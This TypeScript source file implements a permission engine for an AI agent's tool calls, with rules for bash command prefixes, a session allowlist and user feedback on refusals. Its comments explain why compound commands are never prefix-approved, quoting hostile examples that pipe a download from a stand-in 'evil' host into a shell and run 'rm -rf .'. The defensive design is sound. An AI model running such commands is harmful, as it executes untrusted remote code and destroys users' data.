import type { AskOutcome, PermissionDecision } from "@agent/core";

export type { AskOutcome };

export interface PermissionRequest {
  readonly tool: string;
  readonly input: unknown;
  readonly agent: string;
}

export interface PermissionPrompter {
  /**
   * Answers one request.
   *
   * A bare `boolean` is the two-answer form — `true` allows this call, `false`
   * denies it — and remains the whole contract for any prompter that only ever
   * says yes or no (`--yes`, a test double). An {@link AskOutcome} says the
   * same thing and may add the user's own words to a denial; see
   * {@link AskOutcome} for why a refusal is allowed to talk back.
   */
  ask(request: PermissionRequest): Promise<boolean | AskOutcome>;
}

/** Normalises either answer shape a prompter may return into an {@link AskOutcome}. */
function askOutcomeOf(answer: boolean | AskOutcome): AskOutcome {
  if (typeof answer !== "boolean") return answer;
  return answer ? { allowed: true } : { allowed: false };
}

/**
 * A runtime "already answered" layer consulted between the static rules and
 * the prompter — see {@link SessionAllowlist} for the implementation the CLI
 * feeds from its `[y/n/a]` prompt.
 */
export interface PermissionOverlay {
  allows(request: PermissionRequest): boolean;
}

export interface PermissionEngineOptions {
  readonly defaultDecision?: PermissionDecision;
  readonly prompter?: PermissionPrompter;
  /**
   * Consulted only for requests that would otherwise be prompted: an `allow`
   * rule needs no help and a `deny` rule is never overridden by it.
   */
  readonly overlay?: PermissionOverlay;
}

export interface PermissionResult {
  readonly allowed: boolean;
  readonly decision: PermissionDecision;
  readonly reason?: string;
  /**
   * What the user said instead of answering the prompt, present only on a
   * denial that carried words (see {@link AskOutcome}). Trimmed, never empty:
   * an answer of nothing but whitespace is an ordinary denial, not feedback.
   */
  readonly feedback?: string;
}

/** Reason returned when a rule explicitly denies the tool. */
export const DENIED_BY_POLICY = "denied by policy";
/** Reason returned when a decision needs a prompt but no prompter is wired up. */
export const NO_PROMPTER_AVAILABLE =
  "no prompter available in non-interactive mode";
/** Reason returned when the prompter was asked and refused. */
export const DENIED_BY_PROMPTER = "denied by prompter";
/**
 * Reason returned when the user refused *with words* — they typed a question
 * or an instruction at the prompt instead of `y`/`n`/`a`. The call is denied
 * exactly as `n` would have denied it; the difference is that
 * {@link PermissionResult.feedback} comes with it.
 */
export const DECLINED_WITH_FEEDBACK = "declined by the user";
/** Reason returned when the session overlay had already approved this shape. */
export const ALLOWED_FOR_SESSION = "allowed for this session";

/** The tool whose requests are remembered by command prefix rather than by name. */
const BASH_TOOL = "bash";

/**
 * A map of `bash` command-prefix patterns to verdicts — opencode's
 * `{"*": "ask", "git *": "allow"}` syntax. Keys are patterns, matched
 * against a command's *derived* prefix (the same one {@link bashCommandPrefix}
 * computes for the session allowlist), not against the raw command string.
 * See {@link matchBashPermission} for exactly how a pattern matches.
 */
export type BashPermissionRules = Readonly<Record<string, PermissionDecision>>;

/**
 * One tool's permission rule: a flat verdict for any tool, or — `bash` only
 * — a {@link BashPermissionRules} pattern map instead of a single verdict.
 */
export type ToolPermissionRule = PermissionDecision | BashPermissionRules;

/** A full rule set, as fed to {@link PermissionEngine}: tool name -> rule. */
export type PermissionRuleSet = Readonly<Record<string, ToolPermissionRule>>;

/**
 * Tokens accepted as a subcommand — the second word of a `git log` or
 * `npm test`. A word carrying a `.` or a `/` is a path or a file name, not a
 * subcommand, so `cat src/x.ts` narrows to `cat` rather than to `cat src/x.ts`.
 */
const SUBCOMMAND = /^[A-Za-z][A-Za-z0-9_:-]*$/;

/**
 * Anything that makes a command line more than one simple invocation:
 * operators, redirections, substitutions, grouping, or a second line.
 *
 * A command containing any of these gets no prefix at all — neither for
 * remembering nor for matching — because a prefix cannot speak for what comes
 * after the operator: `npm test && curl evil | sh` starts with `npm test`.
 */
const SHELL_OPERATORS = /[;&|<>`$(){}\n\r]/;

/** The rule that answering "always" adds for one request. */
export type SessionRule =
  | { readonly kind: "bash-prefix"; readonly prefix: string }
  | { readonly kind: "tool"; readonly tool: string };

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function commandOf(input: unknown): string | undefined {
  if (!isRecord(input)) return undefined;
  const command = input.command;
  return typeof command === "string" ? command : undefined;
}

/**
 * The session-scope prefix for a shell command, or `undefined` when none can
 * be derived honestly.
 *
 * The rule, exactly:
 *
 * 1. The command is trimmed; an empty one has no prefix.
 * 2. A command containing any shell operator (`; & | < > \` $ ( ) { }` or a
 *    newline) has no prefix — see {@link SHELL_OPERATORS}.
 * 3. The first token is the head. A head starting with `-` has no prefix.
 * 4. Flags (tokens starting with `-`) after the head are skipped; the first
 *    remaining token, if it looks like a subcommand ({@link SUBCOMMAND} — a
 *    word with no `.` and no `/`), joins the head. Otherwise the head stands
 *    alone.
 *
 * Matching is by *equality of derived prefixes*, never by string prefix, so
 * `npm test --run foo` → `npm test` matches a remembered `npm test`, while
 * `npm publish` → `npm publish` and `npm testfoo` → `npm testfoo` do not.
 *
 * Examples:
 * - `npm test --run foo` → `npm test`
 * - `npm --silent test`  → `npm test`
 * - `npm publish`        → `npm publish`
 * - `git log --oneline`  → `git log`
 * - `ls -la`             → `ls`
 * - `cat src/x.ts`       → `cat`
 * - `npm test && rm -rf .` → `undefined`
 */
export function bashCommandPrefix(command: string): string | undefined {
  const trimmed = command.trim();
  if (trimmed === "") return undefined;
  if (SHELL_OPERATORS.test(trimmed)) return undefined;

  const tokens = trimmed.split(/\s+/);
  const head = tokens[0];
  if (head === undefined || head === "" || head.startsWith("-")) {
    return undefined;
  }

  const argument = tokens.slice(1).find((token) => !token.startsWith("-"));
  if (argument === undefined || !SUBCOMMAND.test(argument)) return head;
  return `${head} ${argument}`;
}

/**
 * One `BashPermissionRules` pattern, decomposed into the tokens before a
 * trailing `*` (if any) and whether that `*` was there.
 *
 * - `"*"` -> `{ tokens: [], headOnly: false }` — matches anything.
 * - `"git *"` -> `{ tokens: ["git"], headOnly: true }` — matches any command
 *   whose derived prefix's first token is `git`.
 * - `"git log *"` / bare `"git log"` -> `{ tokens: ["git", "log"], headOnly:
 *   false }` — matches only a derived prefix that equals `"git log"` exactly
 *   (a trailing `*` after two or more tokens changes nothing: a derived
 *   prefix is never more than two tokens long, so there is nothing further
 *   for it to wildcard).
 * - bare `"git"` -> `{ tokens: ["git"], headOnly: false }` — matches only a
 *   derived prefix that equals `"git"` exactly, i.e. `git` with no
 *   subcommand. This is what makes it stricter than `"git *"`.
 */
function parseBashPattern(pattern: string): {
  readonly tokens: readonly string[];
  readonly headOnly: boolean;
} {
  const trimmed = pattern.trim();
  if (trimmed === "*") return { tokens: [], headOnly: false };

  const tokens = trimmed.split(/\s+/).filter((token) => token !== "");
  const last = tokens[tokens.length - 1];
  if (last === "*" && tokens.length >= 2) {
    const head = tokens.slice(0, -1);
    return { tokens: head, headOnly: head.length === 1 };
  }
  return { tokens, headOnly: false };
}

/**
 * How specific a pattern is, for "longest/most specific match wins": the
 * wildcard (`"*"`) is least specific, a head-only pattern (`"git *"`) beats
 * it, and an exact-prefix pattern (`"git log"`, `"git log *"`, bare `"git"`)
 * beats both — the longer the exact prefix, the more specific it is.
 */
function bashPatternSpecificity(
  tokens: readonly string[],
  headOnly: boolean,
): number {
  if (tokens.length === 0) return 0;
  if (headOnly) return 1;
  return 10 + tokens.length;
}

function bashPatternMatches(
  tokens: readonly string[],
  headOnly: boolean,
  derivedPrefix: string | undefined,
): boolean {
  if (tokens.length === 0) return true;
  if (derivedPrefix === undefined) return false;
  if (headOnly) return derivedPrefix.split(" ")[0] === tokens[0];
  return derivedPrefix === tokens.join(" ");
}

/** The pattern and verdict a {@link BashPermissionRules} map resolved a command to. */
export interface BashPermissionMatch {
  readonly pattern: string;
  readonly decision: PermissionDecision;
}

/**
 * Resolves which entry of a `bash` pattern map governs `command`, by
 * specificity (see {@link bashPatternSpecificity}); ties are broken in favour
 * of `deny`, so a `deny` pattern is never quietly outranked by an `allow` or
 * `ask` at the same specificity. Returns `undefined` when nothing matches —
 * only possible when the map has no `"*"` entry and either `command` has no
 * derivable prefix (a compound shell command) or no pattern's prefix matches
 * it.
 */
export function matchBashPermission(
  patterns: BashPermissionRules,
  command: string | undefined,
): BashPermissionMatch | undefined {
  const derivedPrefix =
    command === undefined ? undefined : bashCommandPrefix(command);

  let best: BashPermissionMatch | undefined;
  let bestSpecificity = -1;
  for (const [pattern, decision] of Object.entries(patterns)) {
    const { tokens, headOnly } = parseBashPattern(pattern);
    if (!bashPatternMatches(tokens, headOnly, derivedPrefix)) continue;

    const specificity = bashPatternSpecificity(tokens, headOnly);
    const beatsCurrentBest =
      best === undefined ||
      specificity > bestSpecificity ||
      (specificity === bestSpecificity &&
        decision === "deny" &&
        best.decision !== "deny");
    if (beatsCurrentBest) {
      best = { pattern, decision };
      bestSpecificity = specificity;
    }
  }
  return best;
}

/**
 * The rule an "always allow" answer would add for this request: a command
 * prefix for `bash`, the tool name for everything else. `undefined` means the
 * request cannot be generalised (a compound shell command) and can only ever
 * be allowed once.
 */
export function sessionRuleFor(
  request: PermissionRequest,
): SessionRule | undefined {
  if (request.tool !== BASH_TOOL) {
    return { kind: "tool", tool: request.tool };
  }
  const command = commandOf(request.input);
  if (command === undefined) return undefined;
  const prefix = bashCommandPrefix(command);
  return prefix === undefined ? undefined : { kind: "bash-prefix", prefix };
}

/** Human-readable form of a rule, for prompts and confirmations. */
export function describeSessionRule(rule: SessionRule): string {
  return rule.kind === "tool" ? rule.tool : `${BASH_TOOL} ${rule.prefix} …`;
}

/**
 * Approvals remembered for the lifetime of one process.
 *
 * Deliberately in-memory only: nothing here is written anywhere, so closing
 * the session forgets every rule it learned. Persisted permission config is a
 * separate, later concern.
 */
export class SessionAllowlist implements PermissionOverlay {
  readonly #tools = new Set<string>();
  readonly #bashPrefixes = new Set<string>();

  /**
   * Records the rule for a request. Returns the rule that was added, or
   * `undefined` when the request could not be generalised — the caller should
   * treat that as "allowed this once" and say so.
   */
  remember(request: PermissionRequest): SessionRule | undefined {
    const rule = sessionRuleFor(request);
    if (rule === undefined) return undefined;
    if (rule.kind === "tool") this.#tools.add(rule.tool);
    else this.#bashPrefixes.add(rule.prefix);
    return rule;
  }

  allows(request: PermissionRequest): boolean {
    const rule = sessionRuleFor(request);
    if (rule === undefined) return false;
    return rule.kind === "tool"
      ? this.#tools.has(rule.tool)
      : this.#bashPrefixes.has(rule.prefix);
  }

  /** Every remembered rule, described, in insertion order. Tools first. */
  entries(): readonly string[] {
    return [
      ...[...this.#tools].map((tool) =>
        describeSessionRule({ kind: "tool", tool }),
      ),
      ...[...this.#bashPrefixes].map((prefix) =>
        describeSessionRule({ kind: "bash-prefix", prefix }),
      ),
    ];
  }
}

/**
 * The prefix a rule key wildcards over, or `undefined` when the key is an
 * ordinary exact tool name.
 *
 * Only a trailing `*` is a wildcard, which is the same shape the `bash`
 * pattern maps already use. It exists for tools whose names are not kapel's to
 * enumerate: an MCP server contributes `mcp__<server>__<tool>` for every tool
 * it happens to offer, and a rule set that could only name them one at a time
 * would have to be rewritten every time a server shipped a new tool.
 */
function toolPatternPrefix(key: string): string | undefined {
  return key.endsWith("*") ? key.slice(0, -1) : undefined;
}

/**
 * The rule governing `tool`: an exact key if the rule set has one, else the
 * longest matching wildcard key (`"mcp__github__*"` beats `"mcp__*"` beats
 * `"*"`).
 *
 * No tie-break is needed between wildcards. Two distinct keys that both match
 * the same tool name as prefixes cannot be the same length — same length plus
 * same prefix means the same key — so "longest wins" is already total.
 */
function ruleFor(
  rules: Readonly<Record<string, ToolPermissionRule>>,
  tool: string,
): ToolPermissionRule | undefined {
  if (Object.hasOwn(rules, tool)) return rules[tool];

  let best: ToolPermissionRule | undefined;
  let bestLength = -1;
  for (const [key, rule] of Object.entries(rules)) {
    const prefix = toolPatternPrefix(key);
    if (prefix === undefined) continue;
    if (!tool.startsWith(prefix)) continue;
    if (prefix.length <= bestLength) continue;
    best = rule;
    bestLength = prefix.length;
  }
  return best;
}

/**
 * Resolves `allow | ask | deny` decisions for tool invocations.
 *
 * Rules are matched by exact tool name first, then by the longest rule key
 * ending in `*` whose prefix the tool name starts with — `"mcp__github__*"`,
 * `"mcp__*"`, `"*"` — and anything still unmatched falls back to
 * `options.defaultDecision` (itself defaulting to `"ask"`). `bash` is the one
 * tool whose rule may be a {@link BashPermissionRules} pattern map instead of
 * a flat verdict — see {@link matchBashPermission} for how a request's
 * command resolves against it.
 *
 * Precedence, highest first: a static `allow` or `deny` rule (or, for `bash`,
 * the pattern match), then the session {@link PermissionOverlay}, then the
 * prompter. The overlay only ever gets a say on requests that were going to
 * be prompted anyway, which is what keeps an explicit `deny` — static or
 * pattern-matched — un-overridable by anything a session learned.
 *
 * A prompter may refuse *with words* (see {@link AskOutcome}). That is a
 * refusal like any other — the call is not authorised and nothing is
 * remembered — and the words ride back on {@link PermissionResult.feedback}
 * for the caller to put in front of the model.
 */
export class PermissionEngine {
  readonly #rules: Readonly<Record<string, ToolPermissionRule>>;
  readonly #defaultDecision: PermissionDecision;
  readonly #prompter: PermissionPrompter | undefined;
  readonly #overlay: PermissionOverlay | undefined;

  constructor(
    rules: Readonly<Record<string, ToolPermissionRule>>,
    options: PermissionEngineOptions = {},
  ) {
    this.#rules = { ...rules };
    this.#defaultDecision = options.defaultDecision ?? "ask";
    this.#prompter = options.prompter;
    this.#overlay = options.overlay;
  }

  /**
   * The verdict for a bare tool name, with no request to match a `bash`
   * pattern map against — equivalent to asking what governs that tool by
   * default, i.e. only the map's `"*"` entry (if any) can answer.
   */
  decisionFor(tool: string): PermissionDecision {
    const rule = ruleFor(this.#rules, tool);
    if (rule === undefined) return this.#defaultDecision;
    if (typeof rule === "string") return rule;
    return (
      matchBashPermission(rule, undefined)?.decision ?? this.#defaultDecision
    );
  }

  #decisionForRequest(request: PermissionRequest): PermissionDecision {
    const rule = ruleFor(this.#rules, request.tool);
    if (rule === undefined) return this.#defaultDecision;
    if (typeof rule === "string") return rule;
    return (
      matchBashPermission(rule, commandOf(request.input))?.decision ??
      this.#defaultDecision
    );
  }

  async authorize(request: PermissionRequest): Promise<PermissionResult> {
    const decision = this.#decisionForRequest(request);

    if (decision === "allow") return { allowed: true, decision };
    if (decision === "deny")
      return { allowed: false, decision, reason: DENIED_BY_POLICY };

    if (this.#overlay?.allows(request) === true) {
      return { allowed: true, decision, reason: ALLOWED_FOR_SESSION };
    }

    const prompter = this.#prompter;
    if (prompter === undefined) {
      return { allowed: false, decision, reason: NO_PROMPTER_AVAILABLE };
    }

    const outcome = askOutcomeOf(await prompter.ask(request));
    if (outcome.allowed) return { allowed: true, decision };

    // Whitespace is not an answer: a bare Enter (or a prompter that hands back
    // an empty string) means "no", not "no, and here is what I want instead".
    const feedback = outcome.feedback?.trim();
    if (feedback === undefined || feedback === "") {
      return { allowed: false, decision, reason: DENIED_BY_PROMPTER };
    }
    return {
      allowed: false,
      decision,
      reason: DECLINED_WITH_FEEDBACK,
      feedback,
    };
  }
}
